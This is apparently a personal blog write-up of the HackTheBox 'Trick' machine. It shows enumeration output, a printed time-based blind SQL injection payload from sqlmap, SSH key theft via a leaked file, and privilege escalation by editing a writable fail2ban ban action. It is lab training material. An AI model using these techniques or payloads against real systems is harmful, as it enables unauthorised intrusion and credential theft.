---
layout: post
title: "Trick Writeup - HackTheBox"
category: OSCP
---

Hello, i have not done a HackTheBox machine in a while. Lets try and pick up where I left of. My knowledge is a bit dusty.

## Enum

```jsx
Autoenum(10.129.234.102) > quick
[~] SCAN MODE: quick

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-10 11:08 EDT
Nmap scan report for trick.htb (10.129.234.102)
Host is up (0.015s latency).
Not shown: 996 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)

25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25

53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian

80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

That SMTP server looks odd:

```jsx
┌──(kali㉿kali)-[~]
└─$ nc -nv 10.129.234.102 25     
(UNKNOWN) [10.129.234.102] 25 (smtp) open
d
s
a
a
a
a
a
a
a
a

220 debian.localdomain ESMTP Postfix (Debian/GNU)
502 5.5.2 Error: command not recognized
502 5.5.2 Error: command not recognized
502 5.5.2 Error: command not recognized
502 5.5.2 Error: command not recognized
502 5.5.2 Error: command not recognized
502 5.5.2 Error: command not recognized
502 5.5.2 Error: command not recognized
502 5.5.2 Error: command not recognized
502 5.5.2 Error: command not recognized
502 5.5.2 Error: command not recognized
500 5.5.2 Error: bad syntax
```

So its postfix, hmmmm, what kind?

```jsx
┌──(kali㉿kali)-[~]
└─$ telnet trick.htb 25
Trying 10.129.234.102...
Connected to trick.htb.
Escape character is '^]'.
HELO
220 debian.localdomain ESMTP Postfix (Debian/GNU)
501 Syntax: HELO hostname
EHLO all
250-debian.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
```

Hmmm does not list the version still, auth was not required to verify root and sshd users:

```jsx
HELO x
250 debian.localdomain
MAIL FROM:test@test.org
250 2.1.0 Ok
RCPT TO:test
550 5.1.1 <test>: Recipient address rejected: User unknown in local recipient table
RCPT TO:admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
RCPT TO:ed
550 5.1.1 <ed>: Recipient address rejected: User unknown in local recipient table
RCPT TO:trick
550 5.1.1 <trick>: Recipient address rejected: User unknown in local recipient table
RCPT TO:root
250 2.1.5 Ok
VRFY root
252 2.0.0 root
EXPN root
502 5.5.2 Error: command not recognized
EXPN sshd
502 5.5.2 Error: command not recognized
VRFY sshd
252 2.0.0 sshd
```

At this point idk whether I can do anything with the SMTP server. So I moved on to the webserver. But also the Webserver did not seem like anything special:

```jsx
┌──(kali㉿kali)-[~]
└─$ nikto -h http://trick.htb                           
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.234.102
+ Target Hostname:    trick.htb
+ Target Port:        80
+ Start Time:         2022-10-10 11:31:16 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.14.2
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 7786 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2022-10-10 11:33:28 (GMT-4) (132 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Found the template for the website: https://github.com/StartBootstrap/startbootstrap-coming-soon

Also DNS server was not very interesting. Maybe there is a subdomain:

```jsx
┌──(kali㉿kali)-[~]
└─$ dig axfr trick.htb @trick.htb 

; <<>> DiG 9.18.4-2-Debian <<>> axfr trick.htb @trick.htb
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 32 msec
;; SERVER: 10.129.234.102#53(trick.htb) (TCP)
;; WHEN: Mon Oct 10 11:46:07 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)

                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts              
[sudo] password for kali:
```

I learned to always dig for subdomains: 

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick.png)

Home.php:

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick1.png)

Users.php:

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick2.png)

We cant create a user sadly, but we can use that for password attack later on. We also have employee.php:

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick3.png)

Tried some SQLMap on `login.php` but that might not be the best URI in town. So I looked further and found this: 

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick4.png)

I went to the network tab and copied the request as a cURL command:

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick5.png)

Sure I want to skip other DBMS’:

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick6.png)

Found this:

```jsx
[12:29:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:29:51] [INFO] testing 'Generic inline queries'
[12:29:51] [INFO] testing 'Generic UNION query (78) - 1 to 10 columns'
[12:29:52] [WARNING] GET parameter 'action' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 6679 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=Administrator' AND (SELECT 9653 FROM (SELECT(SLEEP(5)))GOUB) AND 'loLo'='loLo&password=
---
[12:29:52] [INFO] the back-end DBMS is MySQL
[12:29:52] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[12:30:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 12:30:37 /2022-10-10/
```

Took a long time but it did something: 

```jsx
[12:41:08] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[12:41:08] [INFO] sqlmap will dump entries of all tables from all databases now
[12:41:08] [INFO] fetching database names
[12:41:08] [INFO] fetching number of databases
[12:41:08] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
[12:43:44] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
2
[12:44:35] [INFO] retrieved: information_
[12:56:19] [ERROR] invalid character detected. retrying..
[12:56:19] [WARNING] increasing time delay to 6 seconds
schema
[13:01:46] [INFO] retrieved: payroll_db
[13:11:55] [INFO] fetching tables for databases: 'information_schema, payroll_db'
[13:11:55] [INFO] fetching number of tables for database 'payroll_db'
[13:11:55] [INFO] retrieved: 11
[13:13:02] [INFO] retrieved: positio
[13:20:44] [ERROR] invalid character detected. retrying..
[13:20:44] [WARNING] increasing time delay to 7 seconds
n
[13:22:40] [ERROR] invalid character detected. retrying..
[13:22:40] [WARNING] increasing time delay to 8 seconds

[13:22:55] [INFO] retrieved: employee
[13:31:30] [INFO] retrieved: 
[13:32:39] [ERROR] invalid character detected. retrying..
[13:32:39] [WARNING] increasing time delay to 9 seconds
de^C
```

Got impatient, so I got a hint from victor:

```jsx
┌──(kali㉿kali)-[~/…/share/sqlmap/output/preprod-payroll.trick.htb]
└─$  ffuf -w /usr/share/wordlists/dirb/big.txt -u http://trick.htb/ -H 'Host: preprod-FUZZ.trick.htb' -v -fs 5480

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://trick.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: preprod-FUZZ.trick.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 5480
________________________________________________

[Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 26ms]
| URL | http://trick.htb/
    * FUZZ: marketing

[Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 16ms]
| URL | http://trick.htb/
| --> | login.php
    * FUZZ: payroll

:: Progress: [20469/20469] :: Job [1/1] :: 2714 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

DNS lied to me….. http://preprod-marketing.trick.htb. Found this out:

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick7.png)

## Initial foothold

Found passwd:

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick8.png)

No passwords but i do know user is michael:

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick9.png)

bing bong there you have the private rsa key. Oh and the flag:

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick10.png)

Nice and easy:

```jsx
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

## Privesc

All you have to edit is the action_ban in fail2ban restart instructions:

- [https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49](https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49)

 

```jsx
michael@trick:/dev/shm$ find /etc -writable -ls 2>/dev/null
   269281      4 drwxrwx---   2 root     security     4096 Oct 10 21:12 /etc/fail2ban/action.d
```

We can see the max retries here:

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick11.png)

ARE YOU FUCKING KIDDING MEE!!!!!!

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick12.png)

I am raging. The file is finally mine:

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick13.png)

Lets set the FUCKING ACTION BAN:

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick14.png)

dont forget to restart:

```jsx
┌──(kali㉿kali)-[~/Documents]
└─$ ssh michael@trick.htb -i privkeym
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Oct 10 21:27:59 2022 from 10.10.14.78
michael@trick:~$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
michael@trick:~$ exit
logout
Connection to trick.htb closed.
```

aight after some restarts this box stopped deleting my files:

![Untitled](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/trick15.png)

Fucking hell. I forgot how angry a computer could make me be……
